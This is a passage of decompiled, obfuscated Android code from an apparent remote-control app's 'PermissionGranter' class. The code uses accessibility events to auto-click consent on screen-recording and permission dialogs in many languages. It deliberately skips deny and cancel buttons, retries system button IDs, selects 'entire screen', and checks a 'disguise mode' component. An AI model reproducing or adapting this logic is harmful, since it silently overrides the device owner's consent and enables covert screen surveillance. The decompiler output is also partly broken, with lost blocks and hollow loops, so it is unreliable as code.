                            if (accessibilityNodeInfoM211283d5 != null && accessibilityNodeInfoM211283d5.performAction(16)) {
                                return true;
                            }
                        } else if (accessibilityNodeInfo2.performAction(16)) {
                            return true;
                        }
                    }
                }
            } catch (Exception unused) {
                t60.m214695b6("⚠️ [权限] 关键词搜索异常: ".concat(str), "msg");
            }
        }
        if (m211307c1(accessibilityNodeInfo, strArr, 0)) {
            return true;
        }
        String string4 = dqtvuisjdVar.getString(R$string.app_name);
        t60.m214694b5(string4, "context.getString(R.string.app_name)");
        return m211282d4(accessibilityNodeInfo, new String[]{string4, dqtvuisjdVar.getPackageName()}, 0);
    }

    /* renamed from: e4 */
    public final void m211312e4(AccessibilityEvent accessibilityEvent) {
        AccessibilityNodeInfo source;
        if (this.f52111a3) {
            return;
        }
        CharSequence packageName = accessibilityEvent.getPackageName();
        String string = packageName != null ? packageName.toString() : null;
        int eventType = accessibilityEvent.getEventType();
        CharSequence className = accessibilityEvent.getClassName();
        String string2 = className != null ? className.toString() : null;
        try {
            source = accessibilityEvent.getSource();
        } catch (Exception unused) {
            source = null;
        }
        AbstractC0780a0.m213692a3(AbstractC0385a0.f55229a0, null, new PermissionGranter$handleAccessibilityEvent$1(this, source, string, eventType, string2, null), 3);
    }

    /* JADX WARN: Multi-variable type inference failed */
    /* JADX WARN: Type inference failed for: r12v1 */
    /* JADX WARN: Type inference failed for: r12v10, types: [java.util.ArrayList] */
    /* JADX WARN: Type inference failed for: r12v11 */
    /* JADX WARN: Type inference failed for: r12v2, types: [int] */
    /* JADX WARN: Type inference failed for: r13v1 */
    /* JADX WARN: Type inference failed for: r13v11 */
    /* JADX WARN: Type inference failed for: r13v12 */
    /* JADX WARN: Type inference failed for: r13v2, types: [int] */
    /* JADX WARN: Type inference failed for: r13v6 */
    /* JADX WARN: Type inference failed for: r13v7, types: [int] */
    /* JADX WARN: Type inference failed for: r14v10, types: [int] */
    /* JADX WARN: Type inference failed for: r14v11, types: [int] */
    /* JADX WARN: Type inference failed for: r14v12 */
    /* JADX WARN: Type inference failed for: r14v4 */
    /* JADX WARN: Type inference failed for: r14v5, types: [int] */
    /* JADX WARN: Type inference failed for: r14v9 */
    /* JADX WARN: Type inference failed for: r4v4, types: [java.util.ArrayList] */
    /* JADX WARN: Type inference failed for: r4v5, types: [java.util.ArrayList] */
    /* JADX WARN: Type inference failed for: r5v5 */
    /* JADX WARN: Type inference failed for: r5v6, types: [int] */
    /* JADX WARN: Type inference failed for: r5v7, types: [int] */
    /* JADX WARN: Type inference failed for: r6v3 */
    /* JADX WARN: Type inference failed for: r6v4, types: [int] */
    /* JADX WARN: Type inference failed for: r6v7, types: [int] */
    /* JADX WARN: Type inference failed for: r9v10, types: [int] */
    /* JADX WARN: Type inference failed for: r9v12 */
    /* JADX WARN: Type inference failed for: r9v9 */
    /* renamed from: e5 */
    public final boolean m211313e5(AccessibilityNodeInfo accessibilityNodeInfo) throws InterruptedException {
        boolean z;
        String string;
        String string2;
        boolean z2;
        boolean z3;
        String string3;
        String string4;
        boolean z4;
        boolean z5;
        String str;
        String string5;
        String string6;
        boolean z6 = false;
        try {
            Thread.sleep(200L);
            String[] strArr = (String[]) AbstractC0715je.m213288h5(AbstractC0715je.m213298i5(dh0.m212602a1(), AbstractC0716jf.m213306g5("立即开始", "现在开始", "开始", "开始录制", "开始投屏", "开始共享", "Start now", "Start", "Begin", "Start recording", "Start casting", "Start sharing", "立即授权", "授予权限", "确认共享", "立即确认", "Start", "Start now", "Start sharing", "Share screen", "Begin recording", "Begin casting", "Record screen", "Cast screen", "Allow recording", "Allow casting", "Start recording", "Start capture"))).toArray(new String[0]);
            String[] strArr2 = (String[]) dh0.f55753a3.toArray(new String[0]);
            int length = strArr.length;
            int i = 0;
            while (true) {
                if (i < length) {
                    ?? M211286d8 = m211286d8(accessibilityNodeInfo, strArr[i]);
                    int size = M211286d8.size();
                    ?? r14 = z6;
                    while (r14 < size) {
                        Object obj = M211286d8.get(r14);
                        r14++;
                        AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj;
                        if (accessibilityNodeInfo2.isClickable() && accessibilityNodeInfo2.isEnabled()) {
                            CharSequence text = accessibilityNodeInfo2.getText();
                            if (text == null || (string6 = text.toString()) == null) {
                                z = z6;
                                str = "";
                            } else {
                                z = z6;
                                str = string6;
                            }
                            try {
                                CharSequence contentDescription = accessibilityNodeInfo2.getContentDescription();
                                String str2 = (contentDescription == null || (string5 = contentDescription.toString()) == null) ? "" : string5;
                                int length2 = strArr2.length;
                                for (?? r9 = z; r9 < length2; r9++) {
                                    int i2 = length;
                                    String str3 = strArr2[r9];
                                    if (!AbstractC0779a1.m213652a5(str, str3, true) && !AbstractC0779a1.m213652a5(str2, str3, true)) {
                                        length = i2;
                                    }
                                    z6 = z;
                                    length = i2;
                                }
                                accessibilityNodeInfo2.performAction(16);
                                Thread.sleep(300L);
                                if (m211293f1()) {
                                    m211329h2();
                                    return true;
                                }
                            } catch (Exception e) {
                                e = e;
                                t60.m214705c6("PermissionGranter", "❌ [权限] Android 10 MediaProjection权限处理异常", e);
                                return z;
                            }
                        }
                    }
                    i++;
                } else {
                    boolean z7 = z6;
                    ?? M211284d6 = m211284d6(accessibilityNodeInfo, "android.widget.Button");
                    int size2 = M211284d6.size();
                    ?? r6 = z7;
                    while (true) {
                        if (r6 >= size2) {
                            ?? arrayList = new ArrayList();
                            m211278c7(accessibilityNodeInfo, arrayList);
                            int size3 = arrayList.size();
                            ?? r5 = z7;
                            while (r5 < size3) {
                                Object obj2 = arrayList.get(r5);
                                r5++;
                                AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) obj2;
                                CharSequence text2 = accessibilityNodeInfo3.getText();
                                if (text2 == null || (string = text2.toString()) == null) {
                                    string = "";
                                }
                                CharSequence contentDescription2 = accessibilityNodeInfo3.getContentDescription();
                                if (contentDescription2 == null || (string2 = contentDescription2.toString()) == null) {
                                    string2 = "";
                                }
                                int length3 = strArr.length;
                                for (?? r12 = z7; r12 < length3; r12++) {
                                    String str4 = strArr[r12];
                                    if (!AbstractC0779a1.m213652a5(string, str4, true) && !AbstractC0779a1.m213652a5(string2, str4, true)) {
                                    }
                                    z2 = true;
                                    break;
                                }
                                z2 = z7;
                                int length4 = strArr2.length;
                                for (?? r13 = z7; r13 < length4; r13++) {
                                    String str5 = strArr2[r13];
                                    if (!AbstractC0779a1.m213652a5(string, str5, true) && !AbstractC0779a1.m213652a5(string2, str5, true)) {
                                    }
                                    z3 = true;
                                    break;
                                }
                                z3 = z7;
                                if (z2 && !z3) {
                                    accessibilityNodeInfo3.performAction(16);
                                    Thread.sleep(300L);
                                    if (m211293f1()) {
                                        m211329h2();
                                    }
                                }
                            }
                            t60.m214726f4("PermissionGranter", "⚠️ [权限] Android 10-未找到允许按钮");
                            return z7;
                        }
                        Object obj3 = M211284d6.get(r6);
                        r6++;
                        AccessibilityNodeInfo accessibilityNodeInfo4 = (AccessibilityNodeInfo) obj3;
                        if (accessibilityNodeInfo4.isClickable() && accessibilityNodeInfo4.isEnabled()) {
                            CharSequence text3 = accessibilityNodeInfo4.getText();
                            if (text3 == null || (string3 = text3.toString()) == null) {
                                string3 = "";
                            }
                            CharSequence contentDescription3 = accessibilityNodeInfo4.getContentDescription();
                            if (contentDescription3 == null || (string4 = contentDescription3.toString()) == null) {
                                string4 = "";
                            }
                            int length5 = strArr.length;
                            for (?? r132 = z7; r132 < length5; r132++) {
                                String str6 = strArr[r132];
                                if (!AbstractC0779a1.m213652a5(string3, str6, true) && !AbstractC0779a1.m213652a5(string4, str6, true)) {
                                }
                                z4 = true;
                                break;
                            }
                            z4 = z7;
                            int length6 = strArr2.length;
                            for (?? r142 = z7; r142 < length6; r142++) {
                                String str7 = strArr2[r142];
                                if (!AbstractC0779a1.m213652a5(string3, str7, true) && !AbstractC0779a1.m213652a5(string4, str7, true)) {
                                }
                                z5 = true;
                                break;
                            }
                            z5 = z7;
                            if (z4 && !z5) {
                                accessibilityNodeInfo4.performAction(16);
                                Thread.sleep(300L);
                                if (m211293f1()) {
                                    m211329h2();
                                    return true;
                                }
                            }
                        }
                    }
                }
            }
            return true;
        } catch (Exception e2) {
            e = e2;
            z = z6;
        }
    }

    /* renamed from: e7 */
    public final boolean m211314e7(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        String string3;
        try {
            if (m211267b1(accessibilityNodeInfo)) {
                return true;
            }
            String[] strArr = {"全屏", "整个屏幕", "完整屏幕", "整屏", "全屏幕", "Full screen", "Entire screen", "Complete screen", "录制整个屏幕", "共享整个屏幕", "共享全屏", "投屏全屏", "Full screen", "Entire screen", "Whole screen", "Complete screen", "Record entire screen", "Share entire screen", "全画面", "画面全体", "전체 화면", "Pantalla completa", "Plein écran", "Vollbild", "Schermo intero", "Весь экран"};
            String[] strArr2 = {"屏幕录制", "Screen recording", "屏幕共享", "Screen sharing", "屏幕投射", "Screen casting", "屏幕捕获", "Screen capture"};
            boolean zM211310d2 = false;
            for (int i = 0; i < 26; i++) {
                ArrayList arrayListM211286d8 = m211286d8(accessibilityNodeInfo, strArr[i]);
                int size = arrayListM211286d8.size();
                int i2 = 0;
                while (true) {
                    if (i2 >= size) {
                        break;
                    }
                    Object obj = arrayListM211286d8.get(i2);
                    i2++;
                    AccessibilityNodeInfo accessibilityNodeInfo2 = (AccessibilityNodeInfo) obj;
                    CharSequence className = accessibilityNodeInfo2.getClassName();
                    String str = "";
                    if (className == null || (string = className.toString()) == null) {
                        string = "";
                    }
                    CharSequence text = accessibilityNodeInfo2.getText();
                    if (text == null || (string2 = text.toString()) == null) {
                        string2 = "";
                    }
                    if (string.equals("android.widget.Button")) {
                        for (int i3 = 0; i3 < 8; i3++) {
                            if (AbstractC0779a1.m213652a5(string2, strArr2[i3], true)) {
                                break;
                            }
                        }
                    }
                    if (!accessibilityNodeInfo2.isClickable()) {
                        AccessibilityNodeInfo parent = accessibilityNodeInfo2.getParent();
                        while (true) {
                            if (parent == null) {
                                AccessibilityNodeInfo parent2 = accessibilityNodeInfo2.getParent();
                                if (parent2 != null) {
                                    int childCount = parent2.getChildCount();
                                    for (int i4 = 0; i4 < childCount; i4++) {
                                        AccessibilityNodeInfo child = parent2.getChild(i4);
                                        if (child != null && child.isClickable()) {
                                            accessibilityNodeInfo2 = child;
                                            break;
                                        }
                                    }
                                    accessibilityNodeInfo2 = null;
                                } else {
                                    accessibilityNodeInfo2 = null;
                                }
                            } else {
                                if (parent.isClickable()) {
                                    accessibilityNodeInfo2 = parent;
                                    break;
                                }
                                parent = parent.getParent();
                            }
                        }
                    }
                    if (accessibilityNodeInfo2 == null) {
                        continue;
                    } else {
                        CharSequence className2 = accessibilityNodeInfo2.getClassName();
                        if (className2 != null && (string3 = className2.toString()) != null) {
                            str = string3;
                        }
                        if (AbstractC0779a1.m213652a5(str, "RadioButton", false) || AbstractC0779a1.m213652a5(str, "CheckBox", false) || AbstractC0779a1.m213652a5(str, "CompoundButton", false) || AbstractC0779a1.m213652a5(str, "Switch", false) || !AbstractC0779a1.m213652a5(str, "Button", false)) {
                            if (accessibilityNodeInfo2.performAction(16)) {
                                m211330h3();
                                zM211310d2 = true;
                                break;
                            }
                        }
                    }
                }
                if (zM211310d2) {
                    break;
                }
            }
            if (!zM211310d2) {
                zM211310d2 = m211309d1(accessibilityNodeInfo);
            }
            if (!zM211310d2) {
                zM211310d2 = m211310d2(accessibilityNodeInfo);
            }
            return !zM211310d2 ? m211334h7(accessibilityNodeInfo) : zM211310d2;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] Android 15全屏选择处理失败", e);
            return false;
        }
    }

    /* JADX WARN: Code restructure failed: missing block: B:217:0x0407, code lost:
    
        r13 = r72;
     */
    /* JADX WARN: Code restructure failed: missing block: B:218:0x040a, code lost:
    
        r13.f52110a2 = false;
        r0 = true;
     */
    /* JADX WARN: Code restructure failed: missing block: B:219:0x040f, code lost:
    
        r0 = th;
     */
    /* JADX WARN: Code restructure failed: missing block: B:221:0x0413, code lost:
    
        r0 = e;
     */
    /* JADX WARN: Removed duplicated region for block: B:105:0x0203  */
    /* JADX WARN: Removed duplicated region for block: B:208:0x03e6  */
    /* renamed from: e8 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void m211315e8(int i, String str) throws Throwable {
        AccessibilityNodeInfo accessibilityNodeInfo;
        int i2;
        boolean zM211316e9;
        boolean z;
        boolean z2;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        boolean z3;
        boolean z4;
        boolean zBooleanValue;
        String[] strArr;
        int i3;
        String lowerCase;
        C0260a2 c0260a2;
        ArrayList arrayList;
        int i4;
        String str2;
        String lowerCase2;
        String string;
        String str3;
        String str4;
        String string2;
        AccessibilityNodeInfo rootInActiveWindow = this.f52108a0.getRootInActiveWindow();
        try {
            if (rootInActiveWindow == null) {
                return;
            }
            try {
                i2 = Build.VERSION.SDK_INT;
            } catch (Exception e) {
                e = e;
            }
            if (i2 == 29 && m211313e5(rootInActiveWindow)) {
                rootInActiveWindow.recycle();
                return;
            }
            this.f52124b6 = System.currentTimeMillis();
            long jCurrentTimeMillis = System.currentTimeMillis();
            long j = jCurrentTimeMillis - this.f52117a9;
            long j2 = this.f52119b1 <= 1 ? 50L : this.f52114a6 <= 3 ? 150L : this.f52118b0 ? 200L : 300L;
            boolean z5 = (i == 32) && m211320f6(str) && j > 30;
            if (j < j2 && !z5) {
                rootInActiveWindow.recycle();
                return;
            }
            this.f52117a9 = jCurrentTimeMillis;
            if (i2 >= 35) {
                Thread.sleep(100L);
            } else if (i2 >= 30) {
                Thread.sleep(80L);
            } else {
                Thread.sleep(50L);
            }
            if (m211293f1() && i2 < 35) {
                m211329h2();
                rootInActiveWindow.recycle();
                return;
            }
            if (m211320f6(str) || this.f52114a6 >= 2) {
                if (i2 < 35 || !m211314e7(rootInActiveWindow)) {
                    zM211316e9 = false;
                    z = false;
                } else {
                    Thread.sleep(500L);
                    rootInActiveWindow = this.f52108a0.getRootInActiveWindow();
                    if (rootInActiveWindow != null) {
                        try {
                            zM211316e9 = m211292e6(rootInActiveWindow);
                            if (zM211316e9) {
                                m211329h2();
                                try {
                                    rootInActiveWindow.recycle();
                                } catch (Exception unused) {
                                }
                                rootInActiveWindow.recycle();
                                return;
                            }
                            try {
                                rootInActiveWindow.recycle();
                            } catch (Exception unused2) {
                            }
                        } finally {
                            try {
                                rootInActiveWindow.recycle();
                            } catch (Exception unused3) {
                            }
                        }
                    } else {
                        zM211316e9 = false;
                    }
                    z = true;
                }
                String[] strArr2 = z ? (String[]) AbstractC0715je.m213288h5(AbstractC0715je.m213298i5(dh0.m212602a1(), AbstractC0716jf.m213306g5("START NOW", "Start now", "Start", "BEGIN", "ALLOW", "OK", "Accept", "Begin recording", "Begin casting", "开始录制", "开始投屏", "立即开始", "现在开始", "开始"))).toArray(new String[0]) : (String[]) AbstractC0715je.m213288h5(AbstractC0715je.m213298i5(dh0.m212602a1(), AbstractC0716jf.m213306g5("START NOW", "Share screen", "共享屏幕", "Start now", "Start", "Start recording or casting", "Allow recording", "Allow casting", "Begin recording", "Begin casting", "Record screen", "Cast screen", "允许录制", "允许投屏", "允许屏幕录制", "允许屏幕投屏", "立即开始", "现在开始", "开始", "开始录制", "开始屏幕录制", "开始投屏", "开始录屏", "开始捕获", "Start recording", "Start capture", "Begin recording", "Record screen", "Allow recording", "Start sharing", "开始共享", "允许共享", "START", "ALLOW", "OK", "Allow", "Agree", "Grant", "Accept", "Yes", "Continue", "允许", "确定", "确认", "授权", "同意", "是", "好", "好的", "继续", "立即授权", "授予权限", "开始共享", "确认共享", "立即确认"))).toArray(new String[0]);
                int length = strArr2.length;
                int i5 = 0;
                while (true) {
                    String str5 = "⚠️ [权限] 跳过拒绝/取消按钮: '";
                    String[] strArr3 = strArr2;
                    z2 = z;
                    if (i5 >= length) {
                        break;
                    }
                    int i6 = length;
                    try {
                        String str6 = strArr3[i5];
                        if (zM211316e9) {
                            break;
                        }
                        ArrayList arrayListM211286d8 = m211286d8(accessibilityNodeInfo, str6);
                        int i7 = i5;
                        int size = arrayListM211286d8.size();
                        int i8 = 0;
                        while (true) {
                            if (i8 >= size) {
                                accessibilityNodeInfo2 = accessibilityNodeInfo;
                                break;
                            }
                            Object obj = arrayListM211286d8.get(i8);
                            int i9 = i8 + 1;
                            AccessibilityNodeInfo accessibilityNodeInfo3 = (AccessibilityNodeInfo) obj;
                            if (z2) {
                                CharSequence text = accessibilityNodeInfo3.getText();
                                if (text != null) {
                                    try {
                                        String string3 = text.toString();
                                        if (string3 == null) {
                                            arrayList = arrayListM211286d8;
                                            str3 = "";
                                        } else {
                                            arrayList = arrayListM211286d8;
                                            str3 = string3;
                                        }
                                        CharSequence contentDescription = accessibilityNodeInfo3.getContentDescription();
                                        if (contentDescription == null || (string2 = contentDescription.toString()) == null) {
                                            i4 = size;
                                            str4 = "";
                                        } else {
                                            i4 = size;
                                            str4 = string2;
                                        }
                                        accessibilityNodeInfo2 = accessibilityNodeInfo;
                                    } catch (Exception e2) {
                                        e = e2;
                                        t60.m214705c6("PermissionGranter", "❌ [权限] 处理MediaProjection对话框失败", e);
                                        accessibilityNodeInfo.recycle();
                                    } catch (Throwable th) {
                                        th = th;
                                        accessibilityNodeInfo.recycle();
                                        throw th;
                                    }
                                    try {
                                        if (AbstractC0779a1.m213652a5(str3, "选择", true)) {
                                            str2 = str5;
                                        } else {
                                            str2 = str5;
                                            if (AbstractC0779a1.m213652a5(str3, "单个", true) || AbstractC0779a1.m213652a5(str3, "应用", true) || AbstractC0779a1.m213652a5(str3, "屏幕", true) || AbstractC0779a1.m213652a5(str3, "整个", true) || AbstractC0779a1.m213652a5(str3, "select", true) || AbstractC0779a1.m213652a5(str3, "single", true) || AbstractC0779a1.m213652a5(str3, "app", true) || AbstractC0779a1.m213652a5(str3, "screen", true) || AbstractC0779a1.m213652a5(str3, "entire", true) || AbstractC0779a1.m213652a5(str4, "选择", true) || AbstractC0779a1.m213652a5(str4, "select", true)) {
                                            }
                                            arrayListM211286d8 = arrayList;
                                            i8 = i9;
                                            size = i4;
                                            accessibilityNodeInfo = accessibilityNodeInfo2;
                                            str5 = str2;
                                        }
                                        t60.m214726f4("PermissionGranter", "⚠️ [权限] Android 15保护-跳过包含选择文本的按钮: '" + ((Object) accessibilityNodeInfo3.getText()) + "'");
                                        arrayListM211286d8 = arrayList;
                                        i8 = i9;
                                        size = i4;
                                        accessibilityNodeInfo = accessibilityNodeInfo2;
                                        str5 = str2;
                                    } catch (Exception e3) {
                                        e = e3;
                                        accessibilityNodeInfo = accessibilityNodeInfo2;
                                        t60.m214705c6("PermissionGranter", "❌ [权限] 处理MediaProjection对话框失败", e);
                                        accessibilityNodeInfo.recycle();
                                    } catch (Throwable th2) {
                                        th = th2;
                                        accessibilityNodeInfo = accessibilityNodeInfo2;
                                        accessibilityNodeInfo.recycle();
                                        throw th;
                                    }
                                }
                            } else {
                                accessibilityNodeInfo2 = accessibilityNodeInfo;
                                arrayList = arrayListM211286d8;
                                i4 = size;
                                str2 = str5;
                            }
                            CharSequence text2 = accessibilityNodeInfo3.getText();
                            if (text2 == null || (string = text2.toString()) == null) {
                                lowerCase2 = "";
                            } else {
                                lowerCase2 = string.toLowerCase(Locale.ROOT);
                                t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                            }
                            if (!dh0.m212606a5(lowerCase2) && !AbstractC0779a1.m213652a5(lowerCase2, "dismiss", true) && !AbstractC0779a1.m213652a5(lowerCase2, "不允许", false) && !AbstractC0779a1.m213652a5(lowerCase2, "禁止", false) && !AbstractC0779a1.m213652a5(lowerCase2, "拒接", false)) {
                                if (accessibilityNodeInfo3.isClickable() || t60.m214686a2(accessibilityNodeInfo3.getClassName(), "android.widget.Button")) {
                                    if (accessibilityNodeInfo3.performAction(16)) {
                                        m211329h2();
                                        zM211316e9 = true;
                                        break;
                                    }
                                    t60.m214726f4("PermissionGranter", "⚠️ [权限] 点击失败，尝试其他方式");
                                }
                                arrayListM211286d8 = arrayList;
                                i8 = i9;
                                size = i4;
                                accessibilityNodeInfo = accessibilityNodeInfo2;
                                str5 = str2;
                            }
                            CharSequence text3 = accessibilityNodeInfo3.getText();
                            StringBuilder sb = new StringBuilder();
                            String str7 = str2;
                            sb.append(str7);
                            sb.append((Object) text3);
                            sb.append("'");
                            t60.m214726f4("PermissionGranter", sb.toString());
                            str5 = str7;
                            arrayListM211286d8 = arrayList;
                            i8 = i9;
                            size = i4;
                            accessibilityNodeInfo = accessibilityNodeInfo2;
                        }
                        i5 = i7 + 1;
                        z = z2;
                        strArr2 = strArr3;
                        length = i6;
                        accessibilityNodeInfo = accessibilityNodeInfo2;
                    } catch (Exception e4) {
                        e = e4;
                        t60.m214705c6("PermissionGranter", "❌ [权限] 处理MediaProjection对话框失败", e);
                        accessibilityNodeInfo.recycle();
                    } catch (Throwable th3) {
                        th = th3;
                        accessibilityNodeInfo.recycle();
                        throw th;
                    }
                }
                accessibilityNodeInfo2 = accessibilityNodeInfo;
                if (!zM211316e9) {
                    String[] strArr4 = {"android:id/button1", "android:id/button_positive", "android:id/ok", "android:id/allow", "android:id/start", "com.android.systemui:id/button_allow", "com.android.systemui:id/allow_button", "com.android.systemui:id/start_button", "com.android.systemui:id/ok", "com.android.systemui:id/positive", "com.android.systemui:id/button_positive", "com.android.systemui:id/button1", "com.android.systemui:id/start_now", "com.android.systemui:id/allow", "com.android.systemui:id/confirm", "android:id/button_once", "android:id/button_always"};
                    int i10 = 0;
                    while (i10 < 17) {
                        String str8 = strArr4[i10];
                        if (zM211316e9) {
                            break;
                        }
                        accessibilityNodeInfo = accessibilityNodeInfo2;
                        Iterator<AccessibilityNodeInfo> it = accessibilityNodeInfo.findAccessibilityNodeInfosByViewId(str8).iterator();
                        while (true) {
                            if (!it.hasNext()) {
                                strArr = strArr4;
                                i3 = i10;
                                break;
                            }
                            AccessibilityNodeInfo next = it.next();
                            CharSequence text4 = next.getText();
                            if (text4 != null) {
                                strArr = strArr4;
                                String string4 = text4.toString();
                                if (string4 != null) {
                                    i3 = i10;
                                    lowerCase = string4.toLowerCase(Locale.ROOT);
                                    t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
                                }
                                if (!dh0.m212606a5(lowerCase) || AbstractC0779a1.m213652a5(lowerCase, "dismiss", true) || AbstractC0779a1.m213652a5(lowerCase, "不允许", false) || AbstractC0779a1.m213652a5(lowerCase, "禁止", false)) {
                                    t60.m214726f4("PermissionGranter", "⚠️ [权限] 跳过拒绝/取消按钮: '" + ((Object) next.getText()) + "'");
                                } else {
                                    try {
                                        if (!AbstractC0779a1.m213652a5(lowerCase, "拒接", false)) {
                                            if (next.isClickable() || t60.m214686a2(next.getClassName(), "android.widget.Button")) {
                                                if (next.performAction(16)) {
                                                    break;
                                                }
                                                t60.m214726f4("PermissionGranter", "⚠️ [权限] ResourceId点击失败: " + str8);
                                            }
                                        }
                                    } catch (Exception e5) {
                                        e = e5;
                                        c0260a2 = this;
                                    } catch (Throwable th4) {
                                        th = th4;
                                        c0260a2 = this;
                                    }
                                }
                                i10 = i3;
                                strArr4 = strArr;
                            } else {
                                strArr = strArr4;
                            }
                            i3 = i10;
                            lowerCase = "";
                            if (dh0.m212606a5(lowerCase)) {
                                t60.m214726f4("PermissionGranter", "⚠️ [权限] 跳过拒绝/取消按钮: '" + ((Object) next.getText()) + "'");
                            }
                            i10 = i3;
                            strArr4 = strArr;
                        }
                        i10 = i3 + 1;
                        accessibilityNodeInfo2 = accessibilityNodeInfo;
                        strArr4 = strArr;
                    }
                }
                accessibilityNodeInfo = accessibilityNodeInfo2;
                if (zM211316e9) {
                    z3 = z2;
                } else {
                    if (z2) {
                        z3 = z2;
                        zBooleanValue = m211280c9(accessibilityNodeInfo, z3);
                        z4 = false;
                    } else {
                        z3 = z2;
                        z4 = false;
                        zBooleanValue = ((Boolean) m211279c8(accessibilityNodeInfo, 0).f57556a0).booleanValue();
                    }
                    if (zBooleanValue) {
                        this.f52110a2 = z4;
                    }
                    zM211316e9 = zBooleanValue;
                }
                if (!zM211316e9) {
                    zM211316e9 = z3 ? m211299g3(accessibilityNodeInfo, z3) : m211298g2(accessibilityNodeInfo);
                    if (zM211316e9) {
                        this.f52110a2 = false;
                    }
                }
                if (!zM211316e9 && !z3 && (zM211316e9 = m211316e9(accessibilityNodeInfo))) {
                    this.f52110a2 = false;
                }
                if (zM211316e9) {
                    this.f52110a2 = false;
                    this.f52114a6 = 0;
                    this.f52118b0 = false;
                    this.f52119b1 = 0;
                    this.f52120b2 = null;
                    AbstractC0780a0.m213692a3(this.f52125b7, null, new PermissionGranter$handleMediaProjectionDialog$1(this, null), 3);
                    AbstractC0780a0.m213692a3(this.f52125b7, null, new PermissionGranter$handleMediaProjectionDialog$2(this, null), 3);
                } else {
                    t60.m214726f4("PermissionGranter", "⚠️ [权限] 所有策略都未能找到并点击权限按钮 (第" + this.f52114a6 + "次尝试)");
                    if (this.f52114a6 >= 8) {
                        t60.m214726f4("PermissionGranter", "⚠️ [权限] 已达到最大重试次数(8)，停止自动点击");
                        t60.m214726f4("PermissionGranter", "⚠️ [权限] 建议-用户需要手动点击权限对话框");
                        this.f52110a2 = false;
                        this.f52118b0 = false;
                        this.f52119b1 = 0;
                        this.f52120b2 = null;
                        m211321f8();
                    }
                }
                accessibilityNodeInfo.recycle();
            }
        } catch (Throwable th5) {
            th = th5;
        }
    }

    /* renamed from: e9 */
    public final boolean m211316e9(AccessibilityNodeInfo accessibilityNodeInfo) {
        String string;
        String string2;
        dqtvuisjd dqtvuisjdVar = this.f52109a1;
        try {
            CharSequence packageName = accessibilityNodeInfo.getPackageName();
            if (packageName == null || (string = packageName.toString()) == null) {
                string = "";
            }
            if (m211275c3(accessibilityNodeInfo, string)) {
                m211260a3(accessibilityNodeInfo, 0);
                if (string.equals("com.android.systemui") || string.equals("android")) {
                    String string3 = dqtvuisjdVar.getString(R$string.app_name);
                    t60.m214694b5(string3, "context.getString(R.string.app_name)");
                    String[] strArr = {string3, dqtvuisjdVar.getPackageName(), "リモートコントロール", "원격 제어", "Control Remoto"};
                    for (int i = 0; i < 5; i++) {
                        String str = strArr[i];
                        for (AccessibilityNodeInfo accessibilityNodeInfo2 : accessibilityNodeInfo.findAccessibilityNodeInfosByText(str)) {
                            CharSequence text = accessibilityNodeInfo2.getText();
                            if (text == null || (string2 = text.toString()) == null) {
                                string2 = "";
                            }
                            accessibilityNodeInfo2.getBoundsInScreen(new Rect());
                            if (string2.equals(str)) {
                                if (!accessibilityNodeInfo2.isClickable()) {
                                    AccessibilityNodeInfo accessibilityNodeInfoM211283d5 = m211283d5(accessibilityNodeInfo2);
                                    if (accessibilityNodeInfoM211283d5 != null) {
                                        accessibilityNodeInfoM211283d5.getBoundsInScreen(new Rect());
                                        if (accessibilityNodeInfoM211283d5.performAction(16)) {
                                            return true;
                                        }
                                        t60.m214726f4("PermissionGranter", "⚠️ [权限] 点击父节点失败: " + str);
                                    } else {
                                        t60.m214726f4("PermissionGranter", "⚠️ [权限] 未找到可点击父节点: " + str);
                                    }
                                } else {
                                    if (accessibilityNodeInfo2.performAction(16)) {
                                        return true;
                                    }
                                    t60.m214726f4("PermissionGranter", "⚠️ [权限] 点击应用失败: " + str);
                                }
                            }
                        }
                    }
                    boolean zM211311d3 = m211311d3(accessibilityNodeInfo);
                    if (!zM211311d3) {
                        zM211311d3 = m211300g4(accessibilityNodeInfo, 0);
                    }
                    if (zM211311d3) {
                        return true;
                    }
                }
            }
            return false;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 处理二次确认页面失败", e);
            return false;
        }
    }

    /* renamed from: f0 */
    public final void m211317f0() throws InterruptedException {
        try {
            if (Build.VERSION.SDK_INT >= 35) {
                if ((this.f52110a2 || !m211293f1() || AbstractC0241a0.f51906a0 == null) ? false : true) {
                    return;
                }
            }
            if (m211293f1()) {
                return;
            }
            if (this.f52110a2 || this.f52121b3) {
                AccessibilityNodeInfo rootInActiveWindow = this.f52108a0.getRootInActiveWindow();
                if (rootInActiveWindow == null) {
                    t60.m214726f4("PermissionGranter", "⚠️ [权限] 无法获取根节点");
                    return;
                }
                m211297g0(rootInActiveWindow, 0);
                Thread.sleep(500L);
                if (m211316e9(rootInActiveWindow)) {
                    return;
                }
                t60.m214726f4("PermissionGranter", "⚠️ [权限] Spinner选择处理失败，尝试备用策略");
            }
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 处理Spinner选择失败", e);
        }
    }

    /* renamed from: f4 */
    public final boolean m211318f4() {
        dqtvuisjd dqtvuisjdVar = this.f52109a1;
        try {
            return dqtvuisjdVar.getPackageManager().getComponentEnabledSetting(new ComponentName(dqtvuisjdVar, (Class<?>) AppVariantE.class)) == 1;
        } catch (Exception e) {
            t60.m214705c6("PermissionGranter", "❌ [权限] 检查伪装模式失败", e);
            return false;
        }
    }

    /* renamed from: f5 */
    public final boolean m211319f5(String str, String str2) {
        String str3 = str + " " + str2;
        Locale locale = Locale.ROOT;
        String lowerCase = str3.toLowerCase(locale);
        t60.m214694b5(lowerCase, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        int i = R$string.app_name;
        dqtvuisjd dqtvuisjdVar = this.f52109a1;
        String string = dqtvuisjdVar.getString(i);
        t60.m214694b5(string, "context.getString(R.string.app_name)");
        String lowerCase2 = string.toLowerCase(locale);
        t60.m214694b5(lowerCase2, "this as java.lang.String).toLowerCase(Locale.ROOT)");
        String packageName = dqtvuisjdVar.getPackageName();
        t60.m214694b5(packageName, "context.packageName");
